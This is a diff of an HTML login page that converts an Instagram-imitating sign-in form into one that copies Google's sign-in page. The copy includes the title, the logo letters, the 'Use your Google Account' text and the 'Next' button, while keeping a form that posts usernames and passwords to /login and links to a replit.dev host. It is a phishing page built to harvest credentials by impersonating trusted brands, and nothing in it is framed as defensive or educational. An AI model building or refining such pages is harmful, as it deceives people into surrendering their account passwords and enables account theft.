@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Instagram</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Sign in – Google</title>
 
-  <style>
+<style>
 * {
   box-sizing: border-box;
   font-family: Arial, Helvetica, sans-serif;
@@ -60,6 +60,7 @@ h1 {
 /* Input */
 .input-group {
   position: relative;
+  margin-top: 20px;
 }
 
 input {
@@ -146,36 +147,48 @@ button {
 button:hover {
   background: #1669c1;
 }
-
-/* status */
-.status {
-  margin-top: 15px;
-  font-size: 13px;
-}
 </style>
 </head>
+
 <body>
-  <div class="container">
-    <img src="instagram-text-icon.svg" alt="Instagram Text Logo" class="logo" />
 
-    <form action="/login" method="POST">
-      <input type="text" name="username" placeholder="Phone number, Email or Username" required />
-      <input type="password" name="passcode" placeholder="Passcode" required />
-      <input type="submit" value="Log In" />
-    </form>
+<div class="container">
 
-    <div class="divider">OR</div>
-
-    <a href="#" class="facebook-login">
-      <img src="facebook-icon1.svg" alt="Facebook Logo" /> Log in with Facebook
-    </a>
-
-    <a href="#" class="forgot-password">Forgot password?</a>
-
-    <div class="footer">
-      Don't have an account? 
-      <a href="https://3039e9e2-3fcb-4591-9642-c447fc3ced90-00-1lclvursct2nf.sisko.replit.dev/" class="signup-link">Sign Up</a>
-    </div>
+  <div class="logo">
+    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
   </div>
+
+  <h1>Sign in</h1>
+  <div class="sub">Use your Google Account</div>
+
+  <!-- YOUR ORIGINAL FORM (kept intact logic) -->
+  <form action="/login" method="POST">
+
+    <div class="input-group">
+      <input type="text" name="username" placeholder=" " required>
+      <label>Email or phone</label>
+    </div>
+
+    <a href="#" class="link">Forgot email?</a>
+
+    <div class="input-group">
+      <input type="password" name="passcode" placeholder=" " required>
+      <label>Enter your password</label>
+    </div>
+
+    <div class="info">
+      Not your device? Use Guest mode to sign in privately.
+      <a href="#">Learn more</a>
+    </div>
+
+    <div class="actions">
+      <a href="https://3039e9e2-3fcb-4591-9642-c447fc3ced90-00-1lclvursct2nf.sisko.replit.dev/" class="create">Create account</a>
+      <button type="submit">Next</button>
+    </div>
+
+  </form>
+
+</div>
+
 </body>
 </html>
